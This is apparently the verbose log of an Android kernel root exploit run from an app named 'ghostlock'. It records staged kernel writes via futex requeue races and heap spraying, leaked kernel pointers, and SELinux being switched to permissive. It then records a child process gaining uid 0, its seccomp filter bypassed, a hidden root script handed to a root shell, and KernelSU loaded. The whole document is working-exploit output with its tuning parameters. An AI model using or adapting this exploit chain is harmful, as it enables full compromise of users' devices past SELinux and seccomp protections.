[33m[*] [0mroot script written path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh bytes=5225
[33m[*] [0mkernel: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[32m[+] [0mresolved profile loaded: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mcpu pair: main=0 consumer=1
[33m[*] [0mruntime home=/data/user/0/com.ghostlock.app/files script=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0mruntime verbose_debug=1
[33m[*] [0mdebug.execution.begin release=5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mdebug.execution.recommended_cpus.main=0
[33m[*] [0mdebug.execution.recommended_cpus.consumer=1
[33m[*] [0mdebug.execution.selected_cpus.main=0
[33m[*] [0mdebug.execution.selected_cpus.consumer=1
[33m[*] [0mdebug.execution.heap.prepare_max_attempts=4
[33m[*] [0mdebug.execution.heap.prepare_timeout_ms=240000
[33m[*] [0mdebug.execution.heap.kernelsnitch_timeout_ms=60000
[33m[*] [0mdebug.execution.race.route_wait_ms=1000
[33m[*] [0mdebug.execution.race.setup_settle_us=50000
[33m[*] [0mdebug.execution.race.state_poll_interval_us=1000
[33m[*] [0mdebug.execution.stages.w1_attempts=15
[33m[*] [0mdebug.execution.stages.w1_settle_us=100000
[33m[*] [0mdebug.execution.stages.w1_scratch_repair_attempts=3
[33m[*] [0mdebug.execution.stages.w2_attempts=15
[33m[*] [0mdebug.execution.stages.w2_settle_us=100000
[33m[*] [0mdebug.execution.stages.w3_chain_rounds=3
[33m[*] [0mdebug.execution.stages.w3_attempts=6
[33m[*] [0mdebug.execution.stages.w3_settle_us=50000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.attempts=2000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.arm_sequence=16
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=20000
[33m[*] [0mdebug.execution.routes.select_stack.enter_delay_us=50000
[33m[*] [0mdebug.execution.routes.select_stack.timeout_us=200000
[33m[*] [0mdebug.execution.routes.select_stack.consumer_max_calls=1
[33m[*] [0mdebug.execution.routes.select_stack.consumer_burst_calls=1
[33m[*] [0mdebug.execution.routes.multicast_waiter.ready_timeout_ms=10000
[33m[*] [0mdebug.execution.routes.multicast_waiter.post_requeue_settle_us=200000
[33m[*] [0mdebug.execution.routes.multicast_waiter.post_adjust_settle_us=100000
[33m[*] [0mdebug.execution.handoff.pre_dispatch_settle_ms=2000
[33m[*] [0mdebug.execution.handoff.module_poll_attempts=30
[33m[*] [0mdebug.execution.handoff.module_poll_interval_ms=100
[33m[*] [0mdebug.execution.handoff.enforce_poll_attempts=200
[33m[*] [0mdebug.execution.handoff.enforce_poll_interval_ms=100
[33m[*] [0mdebug.execution.end
[33m[*] [0msoc: qcom/other; kernel_phys_load=0xa8000000
[33m[*] [0minit_cred image=ffffffc082bfd588 alias=ffffff802abfd588
[33m[*] [0miomem cache: direct_map_end=ffffff8a80000000
[32m[+] [0mstartup context pid=14361 uid=10510 euid=10510 gid=10510 egid=10510 boot_ms=363169 attr=u:r:untrusted_app:s0:c254,c257,c512,c768 enforce=unreadable
[32m[+] [0mstartup limits pid=14361 NoNewPrivs=0 Seccomp=2 Seccomp_filters=1
[32m[+] [0mbuild config pid=14361 label=ghostlock_oplus slide=pselect main=pselect
[32m[+] [0mp0 profile pid=14361 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802ab01e28 bootid_data=ffffff802adc6819 init_task=ffffff802ac43400 root_tg=ffffff802ad58ac0 sysctl_bootid=ffffff802adc6819
[33m[*] [0mp0 kernel_phys_load=00000000a8000000 delta=0000000028000000
[33m[*] [0mmain thread running on cpu=0
[33m[*] [0m[T+0ms] exploit start
[31m[-] [0mSELinux enforce unreadable; assuming enforcing and running W1
[33m[*] [0m[T+1ms] pre-W1 drain
[33m[*] [0mW1: SELinux attempt 1/1
[33m[*] [0m=== W1: SELinux === target=0xffffff802adaad88 mode=1 leaf=0
[33m[*] [0m[T+236ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +267ms
[33m[*] [0m[spray] finding futex collisions... +530ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2155ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff881e0df400 +2187ms
[33m[*] [0m[spray] payload ready +2189ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2331ms
[33m[*] [0m[T+2572ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+4581ms]   PI route done
[32m[+] [0mSELinux permissive
[33m[*] [0mW1b: private scratch repair attempt 1/3
[33m[*] [0m=== W1b: private scratch repair === target=0xffffff881e0d8108 mode=1 leaf=1
[33m[*] [0m[T+4685ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +243ms
[33m[*] [0m[spray] finding futex collisions... +493ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2001ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff88462a7800 +2048ms
[33m[*] [0m[spray] payload ready +2054ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2220ms
[33m[*] [0m[T+6909ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+8916ms]   PI route done
[32m[+] [0mprivate scratch repaired; releasing quarantine
[33m[*] [0m[T+8920ms] Write 1 complete
[33m[*] [0m[T+9124ms] pre-W2 drain
[33m[*] [0mperf task: 0xffffff8913ecec00 (149/256 votes)
[33m[*] [0mperf task: 0xffffff8913ecec00 (184/256 votes)
[33m[*] [0m[T+9883ms] perf_find_task done
[33m[*] [0mchild_pid=19793 child_task=0xffffff8913ecec00
[33m[*] [0mvr.ko not loaded; skipping tag clear
[33m[*] [0mW2: cred attempt 1/15
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +245ms
[33m[*] [0m[spray] finding futex collisions... +495ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2030ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff88449d5000 +2101ms
[33m[*] [0m[spray] payload ready +2105ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2272ms
[33m[*] [0mW2 fast repair payload prebuilt
[33m[*] [0m=== W2: cred === target=0xffffff8913ecf398 mode=2 leaf=0
[33m[*] [0m[T+12385ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +239ms
[33m[*] [0m[spray] finding futex collisions... +489ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2001ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff884223f800 +2063ms
[33m[*] [0m[spray] payload ready +2067ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2223ms
[33m[*] [0m[T+14612ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+16620ms]   PI route done
[33m[*] [0mW2b: firing prebuilt init_cred+8 repair
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0mchild uid = 0
[32m[+] [0mchild is root!
[33m[*] [0mW3: TIF_SECCOMP+mode attempt 1/6
[33m[*] [0m=== W3: TIF_SECCOMP === target=0xffffff8913ecec00 mode=1 leaf=1
[33m[*] [0m[T+17950ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +229ms
[33m[*] [0m[spray] finding futex collisions... +492ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1981ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8848230800 +2041ms
[33m[*] [0m[spray] payload ready +2044ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2200ms
[33m[*] [0m[T+20156ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+22164ms]   PI route done
[33m[*] [0m=== W3: seccomp mode === target=0xffffff8913ecf460 mode=1 leaf=1
[33m[*] [0m[T+22223ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +241ms
[33m[*] [0m[spray] finding futex collisions... +517ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1995ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8844e8c800 +2044ms
[33m[*] [0m[spray] payload ready +2047ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2212ms
[33m[*] [0m[T+24439ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+26448ms]   PI route done
[33m[*] [0mseccomp finit_module probe = 0x16
[32m[+] [0mchild seccomp filter bypassed (finit_module errno=22)
[32m[+] [0mchild seccomp fully bypassed (forked workers run filter-free)
[33m[*] [0m[T+28505ms] exploit complete
[33m[*] [0mhandoff: child=19793 alive=1 sent=1 errno=0
[33m[*] [0mhandoff: root script path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0mhandoff: root shell worker pid=30386
[33m[*] [0mhandoff: script open fd=3 errno=0 path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0menforce=1 (enforcing)
[32m[+] [0mKernelSU ready
